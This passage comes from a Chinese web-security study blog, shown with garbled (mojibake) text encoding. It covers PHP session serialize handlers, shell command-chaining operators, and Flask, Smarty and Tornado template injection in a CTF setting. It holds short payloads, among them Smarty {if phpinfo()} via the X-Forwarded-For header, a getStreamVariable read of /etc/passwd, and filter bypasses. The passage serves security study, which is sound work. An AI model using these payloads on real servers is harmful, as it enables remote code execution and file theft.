<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment"># ä¸ºäº†æ–¹ä¾¿ACSIIæ˜¾ç¤ºï¼Œå°†é”®åè®¾ç½®ä¸º36ä¸ªå­—ç¬¦é•¿åº¦</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç”±äºä¸‰ç§æ–¹å¼<code>PHPSESSID</code>æ–‡ä»¶åéƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œåªéœ€è¦æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p>
<p><img src="https://image.3001.net/images/20220311/1646988665_622b0d79304714550f427.png!small" alt="img"></p>
<table>
<thead>
<tr>
<th align="center">é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦</th>
<th align="center">é”®å</th>
<th align="center">ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼.</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$</td>
<td align="center">namenamenamenamenamenamenamenamename</td>
<td align="center">s:6:â€hardenâ€;</td>
</tr>
</tbody></table>
<h5 id="php-serialize-å¤„ç†å™¨"><a href="#php-serialize-å¤„ç†å™¨" class="headerlink" title="php_serialize å¤„ç†å™¨"></a>php_serialize å¤„ç†å™¨</h5><p>ä½¿ç”¨php_binaryå¤„ç†å™¨ï¼Œå³<code>session.serialize_handler = php_serialize</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶å†…å®¹å³ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„æ•°ç»„ï¼Œ<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;harden&quot;;&#125;</code></p>
<p><img src="https://image.3001.net/images/20220311/1646988666_622b0d7a2a04733d2da9c.png!small" alt="img"></p>
<h2 id="åäºŒã€rce"><a href="#åäºŒã€rce" class="headerlink" title="åäºŒã€rce"></a>åäºŒã€rce</h2><blockquote>
<p>â€œ<code>|</code>â€:ç®¡é“ç¬¦ï¼Œå‰é¢å‘½ä»¤æ ‡å‡†è¾“å‡ºï¼Œåé¢å‘½ä»¤çš„æ ‡å‡†è¾“å…¥ã€‚ä¾‹å¦‚ï¼šhelp |more</p>
<p>â€œ<code>&amp;</code>â€ commandA <code>&amp;</code> commandB å…ˆè¿è¡Œå‘½ä»¤<code>A</code>ï¼Œç„¶åè¿è¡Œå‘½ä»¤<code>B</code> </p>
<p>â€œ<code>||</code>â€ commandA <code>||</code> commandB è¿è¡Œå‘½ä»¤<code>A</code>ï¼Œå¦‚æœå¤±è´¥åˆ™è¿è¡Œå‘½ä»¤<code>B</code> </p>
<p>â€œ<code>&amp;&amp;</code>â€ commandA <code>&amp;&amp;</code> commandB è¿è¡Œå‘½ä»¤<code>A</code>ï¼Œå¦‚æœæˆåŠŸåˆ™è¿è¡Œå‘½ä»¤<code>B</code></p>
</blockquote>
<h2 id="åä¸‰ã€ssti"><a href="#åä¸‰ã€ssti" class="headerlink" title="åä¸‰ã€ssti"></a>åä¸‰ã€ssti</h2><blockquote>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html">å‚è€ƒæ–‡ç« </a></p>
</blockquote>
<p>æ ¹æ®ä¸‹å›¾ï¼Œæ¨æµ‹ä¸åŒçš„æ¨¡æ¿æ³¨å…¥ï¼Œç„¶åä½¿ç”¨ä¸åŒçš„æ³¨å…¥æ–¹æ³•</p>
<p><img src="/post/Web-study/image-20220903123146044.png" alt="image-20220903123146044"></p>
<p><img src="/post/Web-study/image-20220903123047693.png" alt="image-20220903123047693"></p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_51353029/article/details/111503731">åŸæ–‡é“¾æ¥1</a></p>
<p><a href="https://www.freebuf.com/articles/network/219913.html">åŸæ–‡é“¾æ¥2</a></p>
<p><u><strong>æ³¨ï¼Œç”±äº è½¬ä¹‰å†…å®¹ Hexoä½¿ç”¨Nunjucksæ¸²æŸ“å¸–å­ï¼ˆè¾ƒæ—©çš„ç‰ˆæœ¬ä½¿ç”¨Swigï¼Œå®ƒä»¬å…·æœ‰ç›¸ä¼¼çš„è¯­æ³•ï¼‰ã€‚ç”¨<code>&#123; &#123; &#125; &#125;</code>æˆ–<code>&#123; ï¼… ï¼… &#125;</code>åŒ…è£…çš„å†…å®¹å°†è¢«è§£æï¼Œå¹¶å¯èƒ½å¯¼è‡´é—®é¢˜ã€‚æ‚¨å¯ä»¥ä½¿ç”¨åŸå§‹æ ‡ç­¾æ’ä»¶åŒ…è£…æ•æ„Ÿå†…å®¹ã€‚</strong></u></p>
<p>è¿™é‡Œæ˜¯æŠŠæ‰€æœ‰{  {}  }å’Œ {  %% }ï¼Œæ²¡æœ‰ç©ºæ ¼ï¼Œæ›¿æ¢æˆæœ‰ç©ºæ ¼çš„ï¼Œæ‰èƒ½ä¸Šä¼ åšå®¢</p>
</blockquote>
<h3 id="å…³äºåŸºäºflaskçš„SSTIæ¼æ´çš„é˜¶æ®µå­¦ä¹ å°ç»“ï¼š"><a href="#å…³äºåŸºäºflaskçš„SSTIæ¼æ´çš„é˜¶æ®µå­¦ä¹ å°ç»“ï¼š" class="headerlink" title="å…³äºåŸºäºflaskçš„SSTIæ¼æ´çš„é˜¶æ®µå­¦ä¹ å°ç»“ï¼š"></a>å…³äºåŸºäºflaskçš„SSTIæ¼æ´çš„é˜¶æ®µå­¦ä¹ å°ç»“ï¼š</h3><h4 id="SSTIçš„ç†è§£ï¼š"><a href="#SSTIçš„ç†è§£ï¼š" class="headerlink" title="SSTIçš„ç†è§£ï¼š"></a>SSTIçš„ç†è§£ï¼š</h4><p>SSTIå’ŒSQLæ³¨å…¥åŸç†å·®ä¸å¤šï¼Œéƒ½æ˜¯å› ä¸ºå¯¹è¾“å…¥çš„å­—ç¬¦ä¸²æ§åˆ¶ä¸è¶³ï¼ŒæŠŠè¾“å…¥çš„å­—ç¬¦ä¸²å½“æˆå‘½ä»¤æ‰§è¡Œã€‚</p>
<h4 id="SSTIå¼•å‘çš„çœŸæ­£åŸå› ï¼š"><a href="#SSTIå¼•å‘çš„çœŸæ­£åŸå› ï¼š" class="headerlink" title="SSTIå¼•å‘çš„çœŸæ­£åŸå› ï¼š"></a>SSTIå¼•å‘çš„çœŸæ­£åŸå› ï¼š</h4><p>render_templateæ¸²æŸ“å‡½æ•°çš„é—®é¢˜</p>
<h4 id="render-templateæ¸²æŸ“å‡½æ•°æ˜¯ä»€ä¹ˆï¼š"><a href="#render-templateæ¸²æŸ“å‡½æ•°æ˜¯ä»€ä¹ˆï¼š" class="headerlink" title="render_templateæ¸²æŸ“å‡½æ•°æ˜¯ä»€ä¹ˆï¼š"></a>render_templateæ¸²æŸ“å‡½æ•°æ˜¯ä»€ä¹ˆï¼š</h4><p>å°±æ˜¯æŠŠHTMLæ¶‰åŠçš„é¡µé¢ä¸ç”¨æˆ·æ•°æ®åˆ†ç¦»å¼€ï¼Œè¿™æ ·æ–¹ä¾¿å±•ç¤ºå’Œç®¡ç†ã€‚å½“ç”¨æˆ·è¾“å…¥è‡ªå·±çš„æ•°æ®ä¿¡æ¯ï¼ŒHTMLé¡µé¢å¯ä»¥æ ¹æ®ç”¨æˆ·è‡ªèº«çš„ä¿¡æ¯æ¥å±•ç¤ºé¡µé¢ï¼Œå› æ­¤æ‰æœ‰äº†è¿™ä¸ªå‡½æ•°çš„ä½¿ç”¨ã€‚</p>
<h4 id="render-templateï¼š"><a href="#render-templateï¼š" class="headerlink" title="render_templateï¼š"></a>render_templateï¼š</h4><p>æ¸²æŸ“å‡½æ•°åœ¨æ¸²æŸ“çš„æ—¶å€™ï¼Œå¾€å¾€å¯¹ç”¨æˆ·è¾“å…¥çš„å˜é‡ä¸åšæ¸²æŸ“ï¼Œ<br>å³ï¼š{  {}  }åœ¨Jinja2ä¸­ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼ŒJinja2åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ{  {}  }åŒ…è£¹çš„å†…å®¹å½“åšå˜é‡è§£ææ›¿æ¢ã€‚æ¯”å¦‚{  {1+1}  }ä¼šè¢«è§£ææˆ2ã€‚å› æ­¤æ‰æœ‰äº†ç°åœ¨çš„æ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚å¾€å¾€å˜é‡æˆ‘ä»¬ä½¿ç”¨{  {è¿™é‡Œæ˜¯å†…å®¹}  }<br>çœŸå› ä¸º{  {}  }åŒ…è£¹çš„ä¸œè¥¿ä¼šè¢«è§£æï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥å®ç°ç±»ä¼¼äºSQLæ³¨å…¥çš„æ¼æ´</p>
<p><code>æ³¨å…¥çš„æ€æƒ³ï¼š</code></p>
<blockquote>
<p>ç”¨å‡½æ•°ä¸æ–­è°ƒç”¨æˆ‘ä»¬è¦ä½¿ç”¨çš„å‘½ä»¤å¦‚ï¼šfileã€readã€openã€lsç­‰ç­‰å‘½ä»¤ï¼Œæˆ‘ä»¬ç”¨è¿™äº›æ¥è¯»å–å†™å…¥é…ç½®æ–‡ä»¶ï¼›</p>
</blockquote>
<h3 id="Smarty-SSTIåˆ©ç”¨"><a href="#Smarty-SSTIåˆ©ç”¨" class="headerlink" title="Smarty SSTIåˆ©ç”¨"></a>Smarty SSTIåˆ©ç”¨</h3><p>Smartyæ˜¯åŸºäºPHPå¼€å‘çš„ï¼Œå¯¹äºSmartyçš„SSTIçš„åˆ©ç”¨æ‰‹æ®µä¸å¸¸è§çš„flaskçš„SSTIæœ‰å¾ˆå¤§åŒºåˆ«ã€‚</p>
<h4 id="æ¼æ´ç¡®è®¤"><a href="#æ¼æ´ç¡®è®¤" class="headerlink" title="æ¼æ´ç¡®è®¤"></a>æ¼æ´ç¡®è®¤</h4><p>ä¸€èˆ¬æƒ…å†µä¸‹è¾“å…¥{$smarty.version}å°±å¯ä»¥çœ‹åˆ°è¿”å›çš„smartyçš„ç‰ˆæœ¬å·ã€‚è¯¥é¢˜ç›®çš„Smartyç‰ˆæœ¬æ˜¯3.1.30</p>
<h4 id="å¸¸è§„åˆ©ç”¨æ–¹å¼"><a href="#å¸¸è§„åˆ©ç”¨æ–¹å¼" class="headerlink" title="å¸¸è§„åˆ©ç”¨æ–¹å¼"></a>å¸¸è§„åˆ©ç”¨æ–¹å¼</h4><h5 id="php-php-æ ‡ç­¾"><a href="#php-php-æ ‡ç­¾" class="headerlink" title="{php}{&#x2F;php}æ ‡ç­¾"></a>{php}{&#x2F;php}æ ‡ç­¾</h5><p>Smartyæ”¯æŒä½¿ç”¨{php}{&#x2F;php}æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤ï¼Œæœ€å¸¸è§„çš„æ€è·¯è‡ªç„¶æ˜¯å…ˆæµ‹è¯•è¯¥æ ‡ç­¾ã€‚ä½†å°±è¯¥é¢˜ç›®è€Œè¨€ï¼Œä½¿ç”¨{php}{&#x2F;php}æ ‡ç­¾ä¼šæŠ¥é”™ï¼š</p>
<p><img src="https://pic3.zhimg.com/80/v2-a24770cd727d793d93abd89d5025ad41_hd.jpg" alt="v2-a24770cd727d793d93abd89d5025ad41_hd.j"></p>
<p>åœ¨Smarty3çš„å®˜æ–¹æ‰‹å†Œé‡Œæœ‰ä»¥ä¸‹æè¿°:</p>
<blockquote>
<p>Smartyå·²ç»åºŸå¼ƒ{php}æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ{php}ä»…åœ¨SmartyBCä¸­å¯ç”¨ã€‚</p>
</blockquote>
<p>è¯¥é¢˜ç›®ä½¿ç”¨çš„æ˜¯Smartyç±»ï¼Œæ‰€ä»¥åªèƒ½å¦å¯»å®ƒè·¯ã€‚</p>
<h5 id="literal-æ ‡ç­¾"><a href="#literal-æ ‡ç­¾" class="headerlink" title="{literal} æ ‡ç­¾"></a>{literal} æ ‡ç­¾</h5><p>å®˜æ–¹æ‰‹å†Œè¿™æ ·æè¿°è¿™ä¸ªæ ‡ç­¾ï¼š</p>
<blockquote>
<p>{literal}å¯ä»¥è®©ä¸€ä¸ªæ¨¡æ¿åŒºåŸŸçš„å­—ç¬¦åŸæ ·è¾“å‡ºã€‚è¿™ç»å¸¸ç”¨äºä¿æŠ¤é¡µé¢ä¸Šçš„Javascriptæˆ–cssæ ·å¼è¡¨ï¼Œé¿å…å› ä¸ºSmartyçš„å®šç•Œç¬¦è€Œé”™è¢«è§£æã€‚</p>
</blockquote>
<p>é‚£ä¹ˆå¯¹äºphp5çš„ç¯å¢ƒæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>phpinfo();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¥å®ç°PHPä»£ç çš„æ‰§è¡Œï¼Œä½†è¿™é“é¢˜çš„é¢˜ç›®ç¯å¢ƒæ˜¯PHP7ï¼Œè¿™ç§æ–¹æ³•å°±å¤±æ•ˆäº†ã€‚</p>
<h4 id="é™æ€æ–¹æ³•"><a href="#é™æ€æ–¹æ³•" class="headerlink" title="é™æ€æ–¹æ³•"></a>é™æ€æ–¹æ³•</h4><p>é€šè¿‡selfè·å–Smartyç±»å†è°ƒç”¨å…¶é™æ€æ–¹æ³•å®ç°æ–‡ä»¶è¯»å†™è¢«ç½‘ä¸Šå¾ˆå¤šæ–‡ç« é‡‡ç”¨ã€‚</p>
<p>Smartyç±»çš„getStreamVariableæ–¹æ³•çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)</span>&#123;        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;            <span class="keyword">while</span>  (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;            &#125;            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);            <span class="keyword">return</span> <span class="variable">$_result</span>;        &#125;        <span class="variable">$smarty</span> =  <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;        <span class="keyword">if</span>  (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;            <span class="keyword">throw</span> <span class="keyword">new</span>  <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);        &#125; <span class="keyword">else</span> &#123;            <span class="keyword">return</span> <span class="literal">null</span>;        &#125;    &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•å¯ä»¥è¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶è¿”å›å…¶å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨selfæ¥è·å–Smartyå¯¹è±¡å¹¶è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¾ˆå¤šæ–‡ç« é‡Œç»™çš„payloadéƒ½å½¢å¦‚ï¼š{self::getStreamVariable(â€œfile:&#x2F;&#x2F;&#x2F;etc&#x2F;passwdâ€)}ã€‚ç„¶è€Œä½¿ç”¨è¿™ä¸ªpayloadä¼šè§¦å‘æŠ¥é”™å¦‚ä¸‹ï¼š</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">Fatal error: Uncaught --&gt; Smarty Compiler: Syntax error <span class="keyword">in</span> template  <span class="string">&quot;string:&lt;meta http-equiv=&quot;</span>...<span class="string">&quot;&gt;Current  IP:&#123;self::getStreamVariable(â€˜file:///etc/passwdâ€™)&#125;&quot;</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="string">&#x27;self&#x27;</span>  <span class="keyword">is</span> <span class="literal">undefined</span> <span class="keyword">or</span> <span class="keyword">not</span> allowed <span class="keyword">by</span> security setting &lt;-- thrown <span class="keyword">in</span>  /<span class="keyword">var</span>/www/html/smarty/libs/sysplugins/smarty_internal_templatecompilerbase.php <span class="literal">on</span> line <span class="number">12</span></span><br></pre></td></tr></table></figure>

<p>å¯è§è¿™ä¸ªæ—§ç‰ˆæœ¬Smartyçš„SSTIåˆ©ç”¨æ–¹å¼å¹¶ä¸é€‚ç”¨äºæ–°ç‰ˆæœ¬çš„Smartyã€‚è€Œä¸”åœ¨3.1.30çš„Smartyç‰ˆæœ¬ä¸­å®˜æ–¹å·²ç»æŠŠè¯¥é™æ€æ–¹æ³•åˆ é™¤ã€‚å¯¹äºé‚£äº›æ–‡ç« æåˆ°çš„åˆ©ç”¨ Smarty_Internal_Write_File ç±»çš„writeFileæ–¹æ³•æ¥å†™shellä¹Ÿç”±äºåŒæ ·çš„åŸå› æ— æ³•ä½¿ç”¨ã€‚</p>
<h5 id="if-æ ‡ç­¾"><a href="#if-æ ‡ç­¾" class="headerlink" title="{if}æ ‡ç­¾"></a>{if}æ ‡ç­¾</h5><p>å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°è¿™æ ·çš„æè¿°ï¼š</p>
<blockquote>
<p>Smartyçš„{if}æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„if éå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{&#x2F;if}. ä¹Ÿå¯ä»¥ä½¿ç”¨{else} å’Œ {elseif}. </p>
<p>å…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œ<br>å¦‚*||*, or, &amp;&amp;, and, is_array(), ç­‰ç­‰</p>
</blockquote>
<p>æ—¢ç„¶å…¨éƒ¨çš„PHPå‡½æ•°éƒ½å¯ä»¥ä½¿ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç å‘¢ï¼Ÿ</p>
<p>å°†XFFå¤´æ”¹ä¸º{if phpinfo()}{&#x2F;if}ï¼Œå¯ä»¥çœ‹åˆ°é¢˜ç›®æ‰§è¡Œäº†phpinfo()</p>
<p><img src="https://pic4.zhimg.com/80/v2-bddead1f721c42eed678d9db9527c0e7_hd.jpg" alt="v2-bddead1f721c42eed678d9db9527c0e7_hd.j"></p>
<p>ç”¨åŒæ ·çš„æ–¹æ³•å¯ä»¥è½»æ¾è·å¾—flag</p>
<p>é¢˜ç›®æ¼æ´ä»£ç </p>
<p>é€šè¿‡getshellä¹‹åçš„æ–‡ä»¶è¯»å–ï¼Œæœ¬é¢˜ä¸­å¼•å‘SSTIçš„ä»£ç ç®€åŒ–åå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);<span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();<span class="variable">$ip</span> =  <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨å­—ç¬¦ä¸²ä»£æ›¿smartyæ¨¡æ¿ï¼Œå¯¼è‡´äº†æ³¨å…¥çš„Smartyæ ‡ç­¾è¢«ç›´æ¥è§£ææ‰§è¡Œï¼Œäº§ç”Ÿäº†SSTIã€‚</p>
<h3 id="Tornado-SSTIåˆ©ç”¨"><a href="#Tornado-SSTIåˆ©ç”¨" class="headerlink" title="Tornado SSTIåˆ©ç”¨"></a>Tornado SSTIåˆ©ç”¨</h3><p><strong>tornadoæ˜¯ç”¨Pythonç¼–å†™çš„WebæœåŠ¡å™¨å…¼Webåº”ç”¨æ¡†æ¶</strong>ï¼Œç®€å•æ¥è¯´å°±æ˜¯ç”¨æ¥ç”Ÿæˆæ¨¡æ¿çš„ä¸œè¥¿ã€‚å’ŒPythonç›¸å…³ï¼Œå’Œæ¨¡æ¿ç›¸å…³</p>
<blockquote>
<p> Tornadoæ¨¡æ¿æ”¯æŒæ§åˆ¶è¯­å¥å’Œè¡¨è¾¾å¼ã€‚</p>
<p> æ§åˆ¶è¯­å¥è¢«{ % % }, e.g. { % if len(items) &gt; 2 %}</p>
<p> è¡¨è¾¾å¼è¢«{ { } }, e.g. { { items[0] } }.</p>
</blockquote>
<p><strong>render()<strong>æ˜¯tornadoé‡Œçš„å‡½æ•°ï¼Œ</strong>å¯ä»¥ç”Ÿæˆhtmlæ¨¡æ¿ã€‚æ˜¯ä¸€ä¸ªæ¸²æŸ“å‡½æ•°</strong>ï¼Œå°±æ˜¯ä¸€ä¸ªå…¬å¼ï¼Œ<strong>èƒ½è¾“å‡ºå‰ç«¯é¡µé¢çš„å…¬å¼ã€‚</strong></p>
<p><strong>Tornado</strong>æ¡†æ¶çš„é™„å±æ–‡ä»¶<strong>handler.settings</strong>ä¸­å­˜åœ¨<strong>cookie_secret</strong></p>
<p><strong>Handler</strong>è¿™ä¸ªå¯¹è±¡ï¼Œ<u>HandleræŒ‡å‘çš„å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„RequestHandlerå¯¹è±¡</u></p>
<blockquote>
<p><code>RequestHandler</code>ä¸­å¹¶æ²¡æœ‰settingsè¿™ä¸ªå±æ€§ï¼Œä¸RequestHandlerå…³è”çš„Applicationå¯¹è±¡ï¼ˆRequestion.applicationï¼‰æ‰æœ‰settingè¿™ä¸ªå±æ€§</p>
<p>handler æŒ‡å‘RequestHandler</p>
<p>è€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settings</p>
<p>æ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼</p>
</blockquote>
<h3 id="ç»•è¿‡è¿‡æ»¤-1"><a href="#ç»•è¿‡è¿‡æ»¤-1" class="headerlink" title="ç»•è¿‡è¿‡æ»¤"></a>ç»•è¿‡è¿‡æ»¤</h3><h4 id="proto-ç»•è¿‡"><a href="#proto-ç»•è¿‡" class="headerlink" title="__proto__ç»•è¿‡"></a><code>__proto__</code>ç»•è¿‡</h4><blockquote>
<h4 id="proto-è¢«è¿‡æ»¤ï¼Œç”¨constructor-prototypeç»•è¿‡"><a href="#proto-è¢«è¿‡æ»¤ï¼Œç”¨constructor-prototypeç»•è¿‡" class="headerlink" title="__proto__è¢«è¿‡æ»¤ï¼Œç”¨constructor.prototypeç»•è¿‡"></a><code>__proto__</code>è¢«è¿‡æ»¤ï¼Œç”¨constructor.prototypeç»•è¿‡</h4><blockquote>
<p>åœ¨JavaScriptä¸­ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåä¸º <code>__proto__</code> çš„å†…ç½®å±æ€§ï¼Œå®ƒæŒ‡å‘è¯¥å¯¹è±¡çš„åŸå‹ã€‚å¯¹è±¡çš„åŸå‹æ˜¯å¦ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒæœ‰è‡ªå·±çš„ <code>__proto__</code> å±æ€§ï¼ŒæŒ‡å‘å®ƒçš„åŸå‹ï¼Œè¿™æ ·å°±å½¢æˆäº†ä¸€æ¡é“¾ï¼Œç§°ä¸ºåŸå‹é“¾ã€‚ä½¿ç”¨ <code>__proto__</code> å±æ€§å¯ä»¥è®¿é—®å’Œä¿®æ”¹å¯¹è±¡çš„åŸå‹ã€‚</p>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¼€å‘äººå‘˜å¯èƒ½å¸Œæœ›è¿‡æ»¤æ‰å¯¹è±¡çš„ <code>__proto__</code> å±æ€§ï¼Œä»¥å¢å¼ºå®‰å…¨æ€§æˆ–é¿å…æ½œåœ¨çš„é—®é¢˜ã€‚ä½†æ˜¯ï¼Œè¿™å¹¶ä¸æ„å‘³ç€é€šè¿‡å…¶ä»–æ–¹å¼å°±æ— æ³•è®¿é—®å¯¹è±¡çš„åŸå‹äº†ã€‚</p>
<p><code>constructor.prototype</code> æ˜¯ä¸€ç§è®¿é—®å¯¹è±¡åŸå‹çš„æ›¿ä»£æ–¹æ³•ã€‚å½“åˆ›å»ºä¸€ä¸ªå‡½æ•°æ—¶ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªåä¸º <code>prototype</code> çš„å±æ€§ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸ºä¸€ä¸ªç©ºå¯¹è±¡ã€‚å½“ä½¿ç”¨è¯¥å‡½æ•°ä½œä¸ºæ„é€ å‡½æ•°åˆ›å»ºæ–°å¯¹è±¡æ—¶ï¼Œè¯¥å¯¹è±¡çš„ <code>__proto__</code> å±æ€§å°†è¢«è®¾ç½®ä¸ºæ„é€ å‡½æ•°çš„ <code>prototype</code> å±æ€§çš„å€¼ã€‚å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨ <code>constructor.prototype</code> è®¿é—®è¯¥å¯¹è±¡çš„åŸå‹ï¼Œè€Œæ— éœ€ä½¿ç”¨ <code>__proto__</code> å±æ€§ã€‚</p>
<p>å°½ç®¡ <code>constructor.prototype</code> å¯ä»¥ç»•è¿‡å¯¹ <code>__proto__</code> çš„è¿‡æ»¤ï¼Œä½†å®ƒæœ¬è´¨ä¸Šä¸ <code>__proto__</code> æ˜¯ç›¸åŒçš„ï¼Œå› æ­¤ä¹Ÿå¯èƒ½å­˜åœ¨æ½œåœ¨çš„å®‰å…¨é—®é¢˜ï¼Œéœ€è¦åœ¨ä»£ç ç¼–å†™æ—¶è¿›è¡Œæ³¨æ„ã€‚</p>
</blockquote>
</blockquote>
<h4 id="åˆ†éš”ç¬¦ç»•è¿‡"><a href="#åˆ†éš”ç¬¦ç»•è¿‡" class="headerlink" title="åˆ†éš”ç¬¦ç»•è¿‡"></a>åˆ†éš”ç¬¦ç»•è¿‡</h4><blockquote>
<p>åˆ©ç”¨æ¨¡æ¿æ¸²æŸ“å‚æ•°ï¼Œå°†delimiteråˆ†å‰²å‚æ•°æ¸²æŸ“è¦†ç›–ï¼Œä½¿å¾—åŸæœ‰çš„æ ‡ç­¾ä»<code>&lt;%=</code>å˜æˆ<code>&lt;?=</code>ã€<code>http://xx/?delimiter=?</code>ã€‘ï¼Œæ•…è€Œæ­£åˆ™åŒ¹é…å¯¹<code>&lt;%=</code>çš„é™åˆ¶å°±ç»•è¿‡äº†</p>
</blockquote>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>å¸¸ç”¨å·¥å…·çš„ä½¿ç”¨</title>
    <url>//post/tooluse(Commontools)/</url>
    <content><![CDATA[<p><code>è®°æ€§ä¸å¥½è®°å½•ä¸€ä¸‹</code></p>
<span id="more"></span>

